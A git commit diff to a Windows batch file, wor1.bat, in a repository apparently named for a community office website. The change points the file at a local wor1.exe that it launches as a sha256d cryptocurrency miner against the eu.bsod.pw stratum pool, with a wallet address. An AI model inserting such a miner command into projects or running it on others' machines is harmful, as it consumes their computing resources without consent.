b5814326eead527ad2aa2d55b476f6391f9a8754
Osama Ahmed <56282088+thecode3@users.noreply.github.com>
2021-03-29 04:50:51 +0200

    Update wor1.bat

--- wor1.bat
+++ wor1.bat
@@ -1,3 +1,3 @@
-https://github.com/thecode3/Trade-And-Talk-Community-Office-WebSite/blob/wor1/wor1.exe -a sha256d -o stratum+tcp://eu.bsod.pw:2496 -u MQvzLkotcHJqD4Pnmqm92rQ1n1PGW7APav -p m=solo,d=0.001
+wor1.exe -a sha256d -o stratum+tcp://eu.bsod.pw:2496 -u MQvzLkotcHJqD4Pnmqm92rQ1n1PGW7APav -p m=solo,d=0.001
 
 pause
